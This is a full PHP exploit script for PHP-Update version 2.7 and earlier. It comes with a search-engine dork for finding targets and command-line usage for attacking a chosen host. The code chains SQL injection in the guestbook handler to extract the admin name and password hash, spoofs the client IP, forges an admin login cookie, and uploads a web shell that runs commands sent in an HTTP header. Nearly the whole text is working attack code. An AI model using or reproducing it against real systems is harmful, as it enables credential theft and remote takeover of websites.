PHP-Update <= 2.7 Multiple Remote Vulnerabilities Exploit
=========================================================



<?php
print_r(&#039;
---------------------------------------------------------------------------
PHP-Update <= 2.7 str_replace() sql injection / privilege escalation /
/ cmd exec ii
by rgod
dork: "Powered by PHP-Update" -site:www.php-update.co.uk -ihackstuff
      -exploit

---------------------------------------------------------------------------
&#039;);
/*
this works regardless of php.ini settings
and against the Php-Update mysql version with Mysql >= 4.1
(allowing subs)
*/

if ($argc<3) {
    print_r(&#039;
---------------------------------------------------------------------------
Usage: php &#039;.$argv[0].&#039; host path cmd OPTIONS
host:      target server (ip/hostname)
path:      path to PHPUpdate
Options:
 -p[port]:    specify a port other than 80
 -P[ip:port]: specify a proxy
Example:
php &#039;.$argv[0].&#039; localhost /phpupd/ ls -la -P1.1.1.1:80
php &#039;.$argv[0].&#039; localhost / ls -la -p81
php &#039;.$argv[0].&#039; localhost / ls -la -tphpupd_
---------------------------------------------------------------------------
&#039;);
    die;
}
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result=&#039;&#039;;$exa=&#039;&#039;;$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = &#039;(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)&#039;;

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy==&#039;&#039;) {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo &#039;No response from &#039;.$host.&#039;:&#039;.$port; die;
    }
  }
  else {
    if (!$c) {
      echo &#039;Not a valid proxy...&#039;;die;
    }
    $parts=explode(&#039;:&#039;,$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo &#039;No response from proxy...&#039;;die;
	}
  }
  fputs($ock,$packet);
  if ($proxy==&#039;&#039;) {
    $html=&#039;&#039;;
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html=&#039;&#039;;
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$port=80;
$proxy="";
$cmd="";

for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p")
and ($temp<>"-P")
and ($temp<>"-t")
) {$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-t")
{
}
}
if (($path[0]<>&#039;/&#039;) or ($path[strlen($path)-1]<>&#039;/&#039;)) {echo &#039;Error... check the path!&#039;; die;}
if ($proxy==&#039;&#039;) {$p=$path;} else {$p=&#039;http://&#039;.$host.&#039;:&#039;.$port.$path;}

function my_encode($my_string)
{
  $encoded="CHAR(";
  for ($k=0; $k<=strlen($my_string)-1; $k++)
  {
    $encoded.=ord($my_string[$k]);
    if ($k==strlen($my_string)-1) {$encoded.=")";}
    else {$encoded.=",";}
  }
  return $encoded;
}
/*
because of the bad use of extract() we can pass arguments
calling directly the /code/guestadd.php script
we have sql injections in multiple arguments, "newmessage",
"newname","newwebsite","newemail"
and we can use quotes because we have:

  [argument] = str_replace("\&#039;","&#039;",[argument]);

on every ones
oh, let me see our query...

 INSERT INTO phpusql_guestbook VALUES(&#039;1&#039;, &#039;[injection here]

so...
*/

$UTAG=my_encode("<USER>");
$PTAG=my_encode("<PASS>");
$SQL.="/**/ON/**/DUPLICATE /**/KEY/**/UPDATE/**/autono=autono+1/*";

//funny, isn&#039;t it? :) we hide password hashes inside guestbook html

//also, I note this, we have a spoofing issue, beacuse of extract()
//let&#039;s overwrite the ip address...
$data=&#039;-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="_SERVER[REMOTE_ADDR]";

1.1.1.1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newmessage";

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newname";

&#039;.$SQL.&#039;
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newwebsite";

1
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="newemail";

1
-----------------------------7d61bcd1f033e--
&#039;;
$packet ="POST ".$p."code/guestadd.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Connection: close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

//so let&#039;s see the admin pair...
$packet ="GET ".$p."index.php?s=guestbook HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
$temp=explode("<USER>",$html);
$user=$temp[1];
$temp=explode("<PASS>",$html);
$pwd=$temp[1];

function is_my_hash($hash)
{
 if (ereg("([a-f0-9]{16})|([A-F0-9]{41})",trim($hash))) {return true;}
 else {return false;}
}

if (is_my_hash($pwd)) {
    print_r(&#039;
admin -> &#039;.$user.&#039;
MySql PASSWORD() hash -> &#039;.$pwd.&#039;
admin cookie -> logincookie[user]=&#039;.$user.&#039;; logincookie[pwd]=&#039;.$pwd.&#039;;
&#039;);
}
else
{  //die("exploit failed...");
   //let&#039;s continue, maybe already executed...
}
sleep(1);

function make_seed()
{
   list($usec, $sec) = explode(&#039; &#039;, microtime());
   return (float) $sec + ((float) $usec * 100000);
}
srand(make_seed());
$v = rand(111111,999999);

//with admin privileges, we upload a php file...
$data=&#039;-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="userfile"; filename="suntzu_&#039;.$v.&#039;.php";
Content-type: text/plain;

<?php set_time_limit(0); error_reporting(7); echo "my_delim"; passthru($_SERVER[HTTP_SUNTZU]); echo "my_delim";?>
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="filecat";

files
-----------------------------7d61bcd1f033e
Content-Disposition: form-data; name="submit";

Upload
-----------------------------7d61bcd1f033e--
&#039;;
$packet ="POST ".$p."admin/uploads.php HTTP/1.0\r\n";
$packet.="Content-Type: multipart/form-data; boundary=---------------------------7d61bcd1f033e\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: logincookie[user]=".$user."; logincookie[pwd]=".$pwd.";\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
sleep(1);

//now launch commands...
$packet ="GET ".$p."files/suntzu_".$v.".php HTTP/1.0\r\n";
$packet.="SUNTZU: ".$cmd."\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (eregi("my_delim",$html)) {
    $temp=explode("my_delim",$html);
    echo $temp[1];
}
else {
    echo "exploit failed...";
}
?>



